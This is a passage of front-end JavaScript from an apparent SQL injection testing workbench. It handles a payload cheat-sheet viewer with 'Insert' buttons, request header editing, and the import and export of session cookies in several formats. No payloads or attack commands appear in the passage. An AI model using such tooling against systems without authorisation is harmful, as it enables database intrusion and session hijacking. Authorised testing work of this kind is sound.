      cheatSheetBody.querySelectorAll('.cheat-db-card').forEach((btn) => {
        btn.addEventListener('click', () => {
          cheatNav.view = 'db';
          cheatNav.dbId = btn.dataset.db;
          cheatNav.q = '';
          cheatNav.detailId = null;
          paintCheatSheet();
        });
      });
      bindCheatItemClicks();
    }

    function bindCheatItemClicks() {
      cheatSheetBody.querySelectorAll('.cheat-entry').forEach((el) => {
        el.addEventListener('click', (e) => {
          if (e.target.closest('[data-pin]')) return;
          cheatNav.detailId = el.dataset.id;
          paintCheatDetail(el.dataset.id);
        });
      });
      cheatSheetBody.querySelectorAll('[data-pin]').forEach((btn) => {
        btn.addEventListener('click', (e) => {
          e.stopPropagation();
          const on = toggleCheatPin(btn.dataset.pin);
          showToast(on ? 'Pinned' : 'Unpinned', 'success');
          paintCheatSheet();
        });
      });
    }

    function paintCheatDetail(id) {
      const ref = findCheatItem(id);
      let ov = $('#cheatDetailOverlay');
      if (!ov) {
        ov = document.createElement('div');
        ov.id = 'cheatDetailOverlay';
        ov.className = 'cheat-detail-overlay';
        cheatSheetBody.appendChild(ov);
      }
      if (!ref) { ov.classList.add('hidden'); return; }
      const { db, cat, item } = ref;
      const pinned = isCheatPinned(item.id);
      const payloads = item.payloads || [];
      ov.classList.remove('hidden');
      ov.innerHTML = `
        <div class="cheat-detail-card">
          <div class="cheat-detail-head">
            <button type="button" class="btn btn-sm btn-ghost" id="cheatDetailClose">← Back</button>
            <span class="cheat-db-tag tag-${db.tag}">${escapeHtml(db.name)}</span>
            <button type="button" class="pin-btn${pinned ? ' active' : ''}" id="cheatDetailPin">${pinned ? 'Pinned' : 'Pin'}</button>
          </div>
          <h3 class="cheat-detail-title"><code>${escapeHtml(item.name)}</code></h3>
          <div class="cheat-detail-sub">${escapeHtml(cat.title)} · ${escapeHtml(item.summary || '')}</div>
          ${item.description ? `<p class="cheat-detail-desc">${escapeHtml(item.description)}</p>` : ''}
          ${item.example ? `<div class="cheat-detail-block"><div class="cheat-detail-label">Example</div><pre class="cheat-pre">${escapeHtml(item.example)}</pre></div>` : ''}
          <div class="cheat-detail-block">
            <div class="cheat-detail-label">Payloads <span class="cheat-count">${payloads.length}</span></div>
            <div class="cheat-payload-list">
              ${payloads.map((p, i) => `
                <div class="cheat-payload-row">
                  <code>${escapeHtml(p)}</code>
                  <button type="button" class="btn btn-sm" data-insert="${i}">Insert</button>
                </div>`).join('') || '<div class="cheat-empty">No sample payloads.</div>'}
            </div>
          </div>
          ${(item.tags && item.tags.length) ? `<div class="cheat-tags">${item.tags.map((t) => `<span class="cheat-tag">${escapeHtml(t)}</span>`).join('')}</div>` : ''}
        </div>`;
      const close = $('#cheatDetailClose');
      if (close) close.addEventListener('click', () => {
        cheatNav.detailId = null;
        ov.classList.add('hidden');
      });
      const pinBtn = $('#cheatDetailPin');
      if (pinBtn) pinBtn.addEventListener('click', () => {
        const on = toggleCheatPin(item.id);
        showToast(on ? 'Pinned — saved' : 'Unpinned', 'success');
        paintCheatSheet();
        if (cheatNav.detailId) paintCheatDetail(cheatNav.detailId);
      });
      ov.querySelectorAll('[data-insert]').forEach((btn) => {
        btn.addEventListener('click', () => {
          const p = payloads[+btn.dataset.insert];
          if (p) insertCheatPayload(p);
        });
      });
    }

    // ===== Helpers =====
    function escapeHtml(str) {
      return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
    }

    /** Plain text pin label only (no neon SVG / emoji). */

    let toastTimer;
    function showToast(msg, type = '') {
      toastEl.textContent = msg;
      toastEl.className = 'toast show' + (type ? ' ' + type : '');
      clearTimeout(toastTimer);
      toastTimer = setTimeout(() => toastEl.classList.remove('show'), 2200);
    }

    // ===== Headers UI =====
    const COMMON_HEADERS = [
      'User-Agent', 'Cookie', 'Authorization', 'Content-Type', 'Accept',
      'Accept-Language', 'Accept-Encoding', 'Referer', 'Origin', 'Host',
      'X-Forwarded-For', 'X-Real-IP', 'X-Requested-With', 'X-CSRF-Token',
      'Cache-Control', 'Connection', 'If-None-Match', 'If-Modified-Since',
      'Content-Length', 'Transfer-Encoding', 'Upgrade-Insecure-Requests',
      'Sec-Fetch-Site', 'Sec-Fetch-Mode', 'Sec-Fetch-Dest', 'DNT',
      'X-API-Key', 'Bearer', 'Proxy-Authorization',
    ];

    const HEADERS_LS_KEY = 'sqli-workbench-headers';

    function loadPersistedHeaders() {
      try {
        const raw = localStorage.getItem(HEADERS_LS_KEY);
        if (!raw) return;
        const arr = JSON.parse(raw);
        if (!Array.isArray(arr) || !arr.length) return;
        // Merge: start with persisted, keep non-persist defaults only if empty
        state.headers = arr.map(h => ({
          key: h.key || '',
          value: h.value || '',
        }));
      } catch { /* ignore */ }
    }

    function savePersistedHeaders() {
      try {
        // Always persist headers until explicitly deleted
        const toSave = state.headers
          .filter(h => (h.key || '').trim())
          .map(h => ({ key: h.key, value: h.value }));
        localStorage.setItem(HEADERS_LS_KEY, JSON.stringify(toSave));
      } catch { /* ignore */ }
    }

    const COOKIE_META_KEY = 'sqli-workbench-cookie-meta';

    function loadCookieMeta() {
      try {
        const raw = localStorage.getItem(COOKIE_META_KEY);
        return raw ? JSON.parse(raw) : {};
      } catch { return {}; }
    }
    function saveCookieMeta(meta) {
      try { localStorage.setItem(COOKIE_META_KEY, JSON.stringify(meta || {})); } catch {}
    }

    function parseCookieHeaderValue(val) {
      const meta = loadCookieMeta();
      const list = [];
      String(val || '').split(';').forEach((part) => {
        const t = part.trim();
        if (!t) return;
        const eq = t.indexOf('=');
        if (eq <= 0) return;
        const name = t.slice(0, eq).trim();
        const value = t.slice(eq + 1).trim();
        const m = meta[name] || {};
        list.push({
          name,
          value,
          active: m.active !== false,
          note: m.note || '',
        });
      });
      return list;
    }

    function cookieListToHeaderValue(list) {
      return (list || [])
        .filter((c) => c.active && c.name)
        .map((c) => `${c.name}=${c.value || ''}`)
        .join('; ');
    }

    function openCookieManager() {
      const cookieHeader = state.headers.find((h) => (h.key || '').toLowerCase() === 'cookie');
      const list = parseCookieHeaderValue(cookieHeader ? cookieHeader.value : '');
      state._cookieMgrList = list.length ? list : [{ name: '', value: '', active: true, note: '' }];
      renderCookieManager();
      $('#cookieMgrOverlay')?.classList.add('open');
      // Expand settings panel while managing cookies
      $('#settingsPanel')?.classList.add('cookie-mgr-open');
    }

    function closeCookieManager() {
      $('#cookieMgrOverlay')?.classList.remove('open');
      $('#settingsPanel')?.classList.remove('cookie-mgr-open');
    }

    function renderCookieManager() {
      const body = $('#cookieMgrBody');
      if (!body) return;
      const list = state._cookieMgrList || [];
      if (!list.length) {
        body.innerHTML = '<div class="adv-hint">No cookies yet. Click + Add.</div>';
        return;
      }
      body.innerHTML = list.map((c, i) => `
        <div class="cookie-mgr-item${c.active ? '' : ' off'}${c.note && String(c.note).trim() ? ' has-note' : ''}" data-i="${i}" title="Click row (not fields) to toggle note">
          <div class="cookie-mgr-row">
            <input type="checkbox" class="ck-active" ${c.active ? 'checked' : ''} title="Active in request" />
            <input type="text" class="ck-name" placeholder="name" value="${escapeHtml(c.name)}" spellcheck="false" />
            <span style="color:var(--text-muted)">=</span>
            <input type="text" class="ck-value" placeholder="value" value="${escapeHtml(c.value)}" spellcheck="false" />
            <button type="button" class="btn-remove-header ck-del" title="Remove">×</button>
          </div>
          <textarea class="cookie-mgr-note ck-note hidden" placeholder="Note (optional)…">${escapeHtml(c.note || '')}</textarea>
        </div>
      `).join('');

      body.querySelectorAll('.cookie-mgr-item').forEach((el) => {
        const i = +el.dataset.i;
        const sync = () => {
          const item = state._cookieMgrList[i];
          if (!item) return;
          item.active = !!el.querySelector('.ck-active')?.checked;
          item.name = el.querySelector('.ck-name')?.value || '';
          item.value = el.querySelector('.ck-value')?.value || '';
          item.note = el.querySelector('.ck-note')?.value || '';
          el.classList.toggle('off', !item.active);
          el.classList.toggle('has-note', !!(item.note && item.note.trim()));
        };
        el.querySelector('.ck-active')?.addEventListener('change', sync);
        el.querySelector('.ck-name')?.addEventListener('input', sync);
        el.querySelector('.ck-value')?.addEventListener('input', sync);
        el.querySelector('.ck-note')?.addEventListener('input', sync);
        // Click on row (not inputs/buttons) toggles note
        el.addEventListener('click', (e) => {
          if (e.target.closest('input, textarea, button, select, a')) return;
          const note = el.querySelector('.ck-note');
          if (!note) return;
          note.classList.toggle('hidden');
          if (!note.classList.contains('hidden')) note.focus();
        });
        el.querySelector('.ck-del')?.addEventListener('click', (e) => {
          e.stopPropagation();
          state._cookieMgrList.splice(i, 1);
          renderCookieManager();
        });
      });
    }

    function saveCookieManager() {
      const list = state._cookieMgrList || [];
      const meta = {};
      list.forEach((c) => {
        if (!c.name) return;
        meta[c.name] = { active: !!c.active, note: c.note || '' };
      });
      saveCookieMeta(meta);

      const headerVal = cookieListToHeaderValue(list);
      let cookieHeader = state.headers.find((h) => (h.key || '').toLowerCase() === 'cookie');
      if (cookieHeader) {
        cookieHeader.value = headerVal;
      } else if (headerVal) {
        state.headers.push({ key: 'Cookie', value: headerVal });
      }
      savePersistedHeaders();
      renderHeaders();
      closeCookieManager();
      showToast('Cookie header updated', 'success');
    }

    // Cookie manager buttons
    (function bindCookieMgr() {
      $('#cookieMgrClose')?.addEventListener('click', closeCookieManager);
      $('#cookieMgrSave')?.addEventListener('click', saveCookieManager);
      $('#cookieMgrAdd')?.addEventListener('click', () => {
        if (!state._cookieMgrList) state._cookieMgrList = [];
        state._cookieMgrList.push({ name: '', value: '', active: true, note: '' });
        renderCookieManager();
      });
      $('#cookieMgrSelectAll')?.addEventListener('click', () => {
        (state._cookieMgrList || []).forEach((c) => { c.active = true; });
        renderCookieManager();
      });
      $('#cookieMgrSelectNone')?.addEventListener('click', () => {
        (state._cookieMgrList || []).forEach((c) => { c.active = false; });
        renderCookieManager();
      });
      $('#cookieMgrImportBtn')?.addEventListener('click', (e) => {
        e.preventDefault();
        openCookieBulkImportPanel();
      });
      $('#cookieMgrExportBtn')?.addEventListener('click', (e) => {
        e.preventDefault();
        openCookieExportPanel();
      });
    })();

    // ===== Smart cookie import / export =====
    function normalizeCookiePair(name, value) {
      name = String(name || '').trim();
      value = String(value == null ? '' : value).trim();
      if (!name || /[\s;]/.test(name)) return null;
      return { name, value, active: true, note: '', selected: true };
    }

    function dedupeCookiePairs(list) {
      const map = new Map();
      (list || []).forEach((c) => {
        if (!c || !c.name) return;
        map.set(c.name, c); // last wins
      });
      return [...map.values()];
    }

    /**
     * Smart multi-format cookie parser.
     * Supports: Cookie header, name=value lines, Set-Cookie lines,
     * Netscape cookies.txt, JSON (EditThisCookie / array / object map), CSV.
     */
    function parseCookieImportText(raw) {
      const text = String(raw || '').trim();
      if (!text) return { cookies: [], format: 'empty' };

      // 1) JSON
      if (text.startsWith('{') || text.startsWith('[')) {
        try {
          const data = JSON.parse(text);
          const out = [];
          if (Array.isArray(data)) {
            data.forEach((item) => {
              if (typeof item === 'string') {
                const eq = item.indexOf('=');
                if (eq > 0) {
                  const p = normalizeCookiePair(item.slice(0, eq), item.slice(eq + 1));
                  if (p) out.push(p);
                }
              } else if (item && typeof item === 'object') {
                const name = item.name || item.key || item.Name || item.Key;
                const value = item.value != null ? item.value : (item.Value != null ? item.Value : '');
                const p = normalizeCookiePair(name, value);
                if (p) {
                  if (item.note) p.note = String(item.note);
                  out.push(p);
                }
              }
            });
          } else if (data && typeof data === 'object') {
            // { session: "abc", token: "xyz" } or { cookies: [...] }
            if (Array.isArray(data.cookies)) {
              return parseCookieImportText(JSON.stringify(data.cookies));
            }
            Object.keys(data).forEach((k) => {
              const v = data[k];
              if (v != null && typeof v !== 'object') {
                const p = normalizeCookiePair(k, v);
                if (p) out.push(p);
              }
            });
          }
          if (out.length) return { cookies: dedupeCookiePairs(out), format: 'json' };
        } catch { /* fall through */ }
      }

      const lines = text.split(/\r?\n/).map((l) => l.trim()).filter(Boolean);
      const out = [];

      // 2) Netscape cookies.txt (# Netscape / tab-separated)
      const netscapeish = lines.filter((l) => l && !l.startsWith('#') && l.includes('\t'));
      if (netscapeish.length && netscapeish.some((l) => l.split('\t').length >= 7)) {
        netscapeish.forEach((l) => {
          const parts = l.split('\t');
          if (parts.length >= 7) {
            const p = normalizeCookiePair(parts[5], parts[6]);
            if (p) out.push(p);
          }
        });
        if (out.length) return { cookies: dedupeCookiePairs(out), format: 'netscape' };
      }

      // 3) CSV header name,value
      if (/^name\s*,\s*value/i.test(lines[0] || '')) {
        lines.slice(1).forEach((l) => {
          const m = l.match(/^([^,]+),(.*)$/);
          if (m) {
            const p = normalizeCookiePair(m[1].replace(/^"|"$/g, ''), m[2].replace(/^"|"$/g, ''));
            if (p) out.push(p);
          }
        });
        if (out.length) return { cookies: dedupeCookiePairs(out), format: 'csv' };
      }

      // 4) Set-Cookie: lines (possibly folded)
      const setCookieLines = lines.filter((l) => /^set-cookie\s*:/i.test(l));
      if (setCookieLines.length) {
        setCookieLines.forEach((l) => {
          const body = l.replace(/^set-cookie\s*:\s*/i, '');
          const first = body.split(';')[0];
          const eq = first.indexOf('=');
          if (eq > 0) {
            const p = normalizeCookiePair(first.slice(0, eq), first.slice(eq + 1));
            if (p) out.push(p);
          }
        });
        if (out.length) return { cookies: dedupeCookiePairs(out), format: 'set-cookie' };
      }

      // 5) Multi-line name=value  OR  single Cookie header with ;
      const joined = lines.join('\n');
      // Prefer line-per-cookie when most lines have =
      const eqLines = lines.filter((l) => l.includes('=') && !l.startsWith('#'));
      if (eqLines.length >= 2 && eqLines.length >= lines.length * 0.6) {
        eqLines.forEach((l) => {
          // strip optional "Cookie:" prefix
          const cleaned = l.replace(/^cookie\s*:\s*/i, '');
          // if line itself has multiple pairs, split
          cleaned.split(';').forEach((part) => {
            const t = part.trim();
            const eq = t.indexOf('=');
            if (eq > 0) {
              const p = normalizeCookiePair(t.slice(0, eq), t.slice(eq + 1));
              if (p) out.push(p);
            }
          });
        });
        if (out.length) return { cookies: dedupeCookiePairs(out), format: 'lines' };
      }

      // 6) Classic Cookie header (single or multi line, semicolon separated)
      const headerBody = joined.replace(/^cookie\s*:\s*/i, '');
      headerBody.split(';').forEach((part) => {
        const t = part.trim();
        if (!t || t.includes('\n')) return;
        const eq = t.indexOf('=');
        if (eq > 0) {
          const p = normalizeCookiePair(t.slice(0, eq), t.slice(eq + 1));
          if (p) out.push(p);
        }
      });
      if (out.length) return { cookies: dedupeCookiePairs(out), format: 'header' };

      return { cookies: [], format: 'unknown' };
    }

    function renderCookieImportPreview() {
      const wrap = $('#cookieImportPreviewWrap');
      const box = $('#cookieImportPreview');
      const applyBtn = $('#cookieImportApplyBtn');
      const list = state._cookieImportPreview || [];
      if (!box) return;
      if (!list.length) {
        if (wrap) wrap.hidden = true;
        if (applyBtn) applyBtn.disabled = true;
        box.innerHTML = '<div class="adv-hint">No cookies detected.</div>';
        return;
      }
      if (wrap) wrap.hidden = false;
      box.innerHTML = list.map((c, i) => `
        <div class="cookie-mgr-item${c.selected ? '' : ' off'}" data-i="${i}">
          <div class="cookie-mgr-row">
            <input type="checkbox" class="ck-imp-sel" ${c.selected ? 'checked' : ''} title="Include" />
            <input type="text" class="ck-name ck-imp-name" value="${escapeHtml(c.name)}" spellcheck="false" />
            <input type="text" class="ck-value ck-imp-val" value="${escapeHtml(c.value)}" spellcheck="false" />
          </div>
        </div>
      `).join('');
      box.querySelectorAll('.cookie-mgr-item').forEach((el) => {
        const i = +el.dataset.i;
        el.querySelector('.ck-imp-sel')?.addEventListener('change', (e) => {
          state._cookieImportPreview[i].selected = e.target.checked;
          el.classList.toggle('off', !e.target.checked);
          updateCookieImportApplyState();
        });
        el.querySelector('.ck-imp-name')?.addEventListener('input', (e) => {
          state._cookieImportPreview[i].name = e.target.value;
        });
        el.querySelector('.ck-imp-val')?.addEventListener('input', (e) => {
          state._cookieImportPreview[i].value = e.target.value;
        });
      });
      updateCookieImportApplyState();
    }

    function updateCookieImportApplyState() {
      const applyBtn = $('#cookieImportApplyBtn');
      if (!applyBtn) return;
      const n = (state._cookieImportPreview || []).filter((c) => c.selected && c.name).length;
      applyBtn.disabled = n === 0;
      applyBtn.textContent = n ? `Import selected (${n})` : 'Import selected';
    }

    function openCookieBulkImportPanel() {
      state._cookieImportPreview = [];
      const ta = $('#cookieImportText');
      if (ta) ta.value = '';
      const hint = $('#cookieImportHint');
      if (hint) hint.textContent = 'Paste any common cookie export format';
      const wrap = $('#cookieImportPreviewWrap');
      if (wrap) wrap.hidden = true;
      const applyBtn = $('#cookieImportApplyBtn');
      if (applyBtn) { applyBtn.disabled = true; applyBtn.textContent = 'Import selected'; }
      if (typeof openVPanel === 'function') openVPanel('cookie-bulk-import');
      else $('#cookieBulkImportPanel')?.classList.add('open');
    }

    function runCookieImportParse() {
      const ta = $('#cookieImportText');
      const raw = ta ? ta.value : '';
      const { cookies, format } = parseCookieImportText(raw);
      state._cookieImportPreview = cookies;
      const hint = $('#cookieImportHint');
      if (hint) {
        hint.textContent = cookies.length
          ? `Detected ${cookies.length} cookie(s) · format: ${format}`
          : 'No cookies detected — try another format';
      }
      renderCookieImportPreview();
      if (!cookies.length) showToast('No cookies detected');
      else showToast(`Detected ${cookies.length} · ${format}`, 'success');
    }

    function applyCookieImport() {
      const selected = (state._cookieImportPreview || []).filter((c) => c.selected && String(c.name || '').trim());
      if (!selected.length) {
        showToast('Select at least one cookie');
        return;
      }
      if (!state._cookieMgrList) state._cookieMgrList = [];
      const byName = new Map(state._cookieMgrList.map((c) => [c.name, c]));
      selected.forEach((c) => {
        const name = String(c.name).trim();
        const value = String(c.value || '');
        if (byName.has(name)) {
          const existing = byName.get(name);
          existing.value = value;
          existing.active = true;
        } else {
          const row = { name, value, active: true, note: c.note || '' };
          state._cookieMgrList.push(row);
          byName.set(name, row);
        }
      });
      renderCookieManager();
      if (typeof closeVPanel === 'function') closeVPanel('cookie-bulk-import');
      else $('#cookieBulkImportPanel')?.classList.remove('open');
      showToast(`Imported ${selected.length} cookie(s)`, 'success');
    }

    function openCookieExportPanel() {
      const list = (state._cookieMgrList || []).filter((c) => c.name);
      state._cookieExportList = list.map((c) => ({
        name: c.name,
        value: c.value || '',
        active: c.active !== false,
        selected: c.active !== false,
      }));
      renderCookieExportList();
      if (typeof openVPanel === 'function') openVPanel('cookie-bulk-export');
      else $('#cookieBulkExportPanel')?.classList.add('open');
    }

    function renderCookieExportList() {
      const box = $('#cookieExportList');
      if (!box) return;
      const list = state._cookieExportList || [];
      if (!list.length) {
        box.innerHTML = '<div class="adv-hint">No cookies in manager. Add some first.</div>';
        return;
      }
      box.innerHTML = list.map((c, i) => `
        <div class="cookie-mgr-item${c.selected ? '' : ' off'}" data-i="${i}">
          <div class="cookie-mgr-row">
            <input type="checkbox" class="ck-exp-sel" ${c.selected ? 'checked' : ''} />
            <input type="text" class="ck-name" value="${escapeHtml(c.name)}" readonly />
            <input type="text" class="ck-value" value="${escapeHtml(c.value)}" readonly />
          </div>
        </div>
      `).join('');
      box.querySelectorAll('.cookie-mgr-item').forEach((el) => {
        const i = +el.dataset.i;
        el.querySelector('.ck-exp-sel')?.addEventListener('change', (e) => {
          state._cookieExportList[i].selected = e.target.checked;
          el.classList.toggle('off', !e.target.checked);
        });
      });
    }

    function getSelectedExportCookies() {
      return (state._cookieExportList || []).filter((c) => c.selected && c.name);
    }

    function formatCookiesExport(cookies, fmt) {
      const list = cookies || [];
      if (fmt === 'json') {
        return JSON.stringify(list.map((c) => ({ name: c.name, value: c.value || '' })), null, 2);
      }
      if (fmt === 'lines') {
        return list.map((c) => `${c.name}=${c.value || ''}`).join('\n');
      }
      if (fmt === 'csv') {
        return ['name,value', ...list.map((c) => {
          const v = String(c.value || '').replace(/"/g, '""');
          const needsQ = /[,"\n]/.test(v);
          return `${c.name},${needsQ ? `"${v}"` : v}`;
        })].join('\n');
      }
      if (fmt === 'netscape') {
        const lines = ['# Netscape HTTP Cookie File', '# https://curl.se/docs/http-cookies.html'];
        list.forEach((c) => {
          // domain \t flag \t path \t secure \t expiry \t name \t value
          lines.push(['.example.com', 'TRUE', '/', 'FALSE', '0', c.name, c.value || ''].join('\t'));
        });
        return lines.join('\n');
      }
      // header default
      return list.map((c) => `${c.name}=${c.value || ''}`).join('; ');
    }

    function getChosenExportFormat() {
      const el = document.querySelector('input[name="cookieExportFmt"]:checked');
      return (el && el.value) || 'header';
    }

    function exportCookiesDownload() {
      const selected = getSelectedExportCookies();
      if (!selected.length) { showToast('Select at least one cookie'); return; }
      const fmt = getChosenExportFormat();
      const text = formatCookiesExport(selected, fmt);
      const ext = ({ header: 'txt', lines: 'txt', json: 'json', netscape: 'txt', csv: 'csv' })[fmt] || 'txt';
      const blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = `cookies-export.${ext}`;
      a.click();
      URL.revokeObjectURL(a.href);
      showToast(`Exported ${selected.length} cookie(s)`, 'success');
    }

    async function exportCookiesCopy() {
      const selected = getSelectedExportCookies();
      if (!selected.length) { showToast('Select at least one cookie'); return; }
      const fmt = getChosenExportFormat();
      const text = formatCookiesExport(selected, fmt);
      try {
        await navigator.clipboard.writeText(text);
        showToast('Copied to clipboard', 'success');
      } catch {
        // fallback
        const ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        try { document.execCommand('copy'); showToast('Copied', 'success'); }
        catch { showToast('Copy failed'); }
        ta.remove();
      }
    }

    (function bindCookieImportExport() {
      $('#cookieImportParseBtn')?.addEventListener('click', runCookieImportParse);
      $('#cookieImportApplyBtn')?.addEventListener('click', applyCookieImport);
      $('#cookieImportSelAll')?.addEventListener('click', () => {
        (state._cookieImportPreview || []).forEach((c) => { c.selected = true; });
        renderCookieImportPreview();
      });
      $('#cookieImportSelNone')?.addEventListener('click', () => {
        (state._cookieImportPreview || []).forEach((c) => { c.selected = false; });
        renderCookieImportPreview();
      });
      $('#cookieImportFile')?.addEventListener('change', (e) => {
        const file = e.target.files && e.target.files[0];
        if (!file) return;
        const reader = new FileReader();
        reader.onload = () => {
          const ta = $('#cookieImportText');
          if (ta) ta.value = String(reader.result || '');
          runCookieImportParse();
        };
        reader.readAsText(file);
        e.target.value = '';
      });
      // Drag-drop onto textarea
      const ta = $('#cookieImportText');
      if (ta) {
        ta.addEventListener('dragover', (e) => { e.preventDefault(); ta.classList.add('drag-over'); });
        ta.addEventListener('dragleave', () => ta.classList.remove('drag-over'));
        ta.addEventListener('drop', (e) => {
          e.preventDefault();
          ta.classList.remove('drag-over');
          const file = e.dataTransfer && e.dataTransfer.files && e.dataTransfer.files[0];
          if (file) {
            const reader = new FileReader();
            reader.onload = () => { ta.value = String(reader.result || ''); runCookieImportParse(); };
            reader.readAsText(file);
          }
        });
      }
      $('#cookieExportSelAll')?.addEventListener('click', () => {
        (state._cookieExportList || []).forEach((c) => { c.selected = true; });
        renderCookieExportList();
      });
      $('#cookieExportSelNone')?.addEventListener('click', () => {
        (state._cookieExportList || []).forEach((c) => { c.selected = false; });
        renderCookieExportList();
      });
      $('#cookieExportDownloadBtn')?.addEventListener('click', exportCookiesDownload);
      $('#cookieExportCopyBtn')?.addEventListener('click', exportCookiesCopy);
    })();

    function renderHeaders() {
      if (!headersList) return;
      headersList.innerHTML = '';
      state.headers.forEach((h, idx) => {
        const row = document.createElement('div');
        const isCookie = (h.key || '').toLowerCase() === 'cookie';
        row.className = 'header-row' + (isCookie ? ' cookie-header-row' : '');
        row.innerHTML = `
          <div class="header-key-wrap">
            <input class="header-key" type="text" placeholder="Header name" value="${escapeHtml(h.key)}" data-idx="${idx}" data-field="key" spellcheck="false" autocomplete="off" />
            <div class="header-suggest" data-idx="${idx}"></div>
          </div>
          <input class="header-value" type="text" placeholder="Value" value="${escapeHtml(h.value)}" data-idx="${idx}" data-field="value" spellcheck="false" />
          ${isCookie ? `<button type="button" class="header-cookie-manage" data-idx="${idx}" title="Manage cookies">Manage</button>` : ''}
          <button class="btn-remove-header" data-idx="${idx}" title="Remove">×</button>`;
        headersList.appendChild(row);
      });

      headersList.querySelectorAll('input').forEach((inp) => {
        inp.addEventListener('input', (e) => {
          const i = +e.target.dataset.idx;
          const field = e.target.dataset.field;
          if (!state.headers[i]) return;
          state.headers[i][field] = e.target.value;
          if (field === 'key') updateHeaderSuggest(e.target);
          savePersistedHeaders();
        });
        if (inp.classList.contains('header-key')) {
          inp.addEventListener('focus', (e) => updateHeaderSuggest(e.target));
          inp.addEventListener('blur', (e) => {
            setTimeout(() => {
              const box = e.target.parentElement.querySelector('.header-suggest');
              if (box) box.classList.remove('open');
              const anyOpen = !!document.querySelector('#stab-headers .header-suggest.open');
              setSettingsSuggestOpen(anyOpen);
              // Refresh row UI when key is Cookie (Manage button)
              renderHeaders();
            }, 150);
          });
          inp.addEventListener('keydown', (e) => {
            const box = e.target.parentElement.querySelector('.header-suggest');
            if (!box || !box.classList.contains('open')) return;
            const items = [...box.querySelectorAll('.header-suggest-item')];
            let active = items.findIndex((el) => el.classList.contains('active'));
            if (e.key === 'ArrowDown') {
              e.preventDefault();
              active = Math.min(items.length - 1, active + 1);
              items.forEach((el, i) => el.classList.toggle('active', i === active));
            } else if (e.key === 'ArrowUp') {
              e.preventDefault();
              active = Math.max(0, active - 1);
              items.forEach((el, i) => el.classList.toggle('active', i === active));
            } else if (e.key === 'Enter' && active >= 0) {
              e.preventDefault();
              items[active].click();
            } else if (e.key === 'Escape') {
              box.classList.remove('open');
            }
          });
        }
      });

      headersList.querySelectorAll('.header-cookie-manage').forEach((btn) => {
        btn.addEventListener('click', (e) => {
          e.stopPropagation();
          openCookieManager();
        });
      });
      // Double-click Cookie value also opens manager
      headersList.querySelectorAll('.cookie-header-row .header-value').forEach((inp) => {
        inp.addEventListener('dblclick', () => openCookieManager());
      });

      headersList.querySelectorAll('.btn-remove-header').forEach((btn) => {
        btn.addEventListener('click', () => {
          state.headers.splice(+btn.dataset.idx, 1);
          savePersistedHeaders();
          renderHeaders();
        });
      });
    }

    function setSettingsSuggestOpen(open) {
      const panel = document.getElementById('settingsPanel');
      if (!panel) return;
      panel.classList.toggle('suggest-open', !!open);
    }

    function updateHeaderSuggest(input) {
      const box = input.parentElement.querySelector('.header-suggest');
      if (!box) return;
      const q = (input.value || '').toLowerCase().trim();
      const used = new Set(state.headers.map((h) => (h.key || '').toLowerCase()));
      let list = COMMON_HEADERS.filter((h) => !used.has(h.toLowerCase()) || h.toLowerCase() === q);
      if (q) list = list.filter((h) => h.toLowerCase().includes(q));
      list = list.slice(0, 8);
      if (!list.length) {
        box.classList.remove('open');
        box.innerHTML = '';
        // keep suggest-open if another box is still open
        const anyOpen = !!document.querySelector('#stab-headers .header-suggest.open');
        setSettingsSuggestOpen(anyOpen);
        return;
      }
      box.innerHTML = list.map((h, i) => {
        let label = escapeHtml(h);
        if (q) {
          const idx = h.toLowerCase().indexOf(q);
          if (idx >= 0) {
            label = escapeHtml(h.slice(0, idx)) + '<mark>' + escapeHtml(h.slice(idx, idx + q.length)) + '</mark>' + escapeHtml(h.slice(idx + q.length));
          }
        }
        return `<div class="header-suggest-item${i === 0 ? ' active' : ''}" data-val="${escapeHtml(h)}">${label}</div>`;
      }).join('');
      box.classList.add('open');
      setSettingsSuggestOpen(true);

      // Scroll the active header row into view so 2–3 items of the dropdown are visible
      const row = input.closest('.header-row');
      const body = document.querySelector('#settingsPanel .vpanel-body');
      if (row && body) {
        // small delay so layout (padding-bottom) applies first
        requestAnimationFrame(() => {
          row.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
        });
      }

      box.querySelectorAll('.header-suggest-item').forEach((item) => {
        item.addEventListener('mousedown', (e) => {
          e.preventDefault();
          const idx = +input.dataset.idx;
          input.value = item.dataset.val;
          if (state.headers[idx]) state.headers[idx].key = item.dataset.val;
          box.classList.remove('open');
          setSettingsSuggestOpen(false);
          // focus value field
          const valInp = input.closest('.header-row')?.querySelector('.header-value');
          if (valInp) valInp.focus();
        });
      });
    }

    addHeaderBtn.addEventListener('click', () => {
      state.headers.push({ key: '', value: '' });
      renderHeaders();
      const rows = headersList.querySelectorAll('.header-row');
      const last = rows[rows.length - 1];
      const keyInp = last && last.querySelector('.header-key');
      if (keyInp) {
        keyInp.focus();
        updateHeaderSuggest(keyInp);
      }
    });
    clearHeadersBtn.addEventListener('click', () => {
      if (!state.headers.length) return;
      if (!confirm('Remove all headers?')) return;
      state.headers = [];
      savePersistedHeaders();
      renderHeaders();
      showToast('All headers cleared');
    });
    function openHeadersSettings() {
      openVPanel('settings');
      switchSettingsTab('headers');
    }
    toggleHeadersBtn.addEventListener('click', openHeadersSettings);
    const payloadHeadersBtn = $('#payloadHeadersBtn');
    if (payloadHeadersBtn) {
      payloadHeadersBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        openHeadersSettings();
      });
    }
    // Load pinned headers early
    loadPersistedHeaders();

    // Settings tabs
    function switchSettingsTab(name) {
      $$('.settings-tab').forEach((t) => t.classList.toggle('active', t.dataset.stab === name));
      $$('.settings-tab-panel').forEach((p) => p.classList.toggle('active', p.id === 'stab-' + name));
      if (name === 'shortcuts' && typeof renderShortcutsList === 'function') renderShortcutsList();
    }
    $$('.settings-tab').forEach((tab) => {
      tab.addEventListener('click', () => switchSettingsTab(tab.dataset.stab));
    });

    // ===== Appearance (persisted in localStorage) =====
    const APPEAR_KEY = 'sqli-workbench-appearance';
    const BG_PRESETS = {
      default: { primary: '#0e0e10', secondary: '#141418', tertiary: '#1a1a22', elevated: '#24242e', input: '#121218' },
      deeper:  { primary: '#050505', secondary: '#0a0a0a', tertiary: '#121212', elevated: '#1c1c1c', input: '#0a0a0a' },
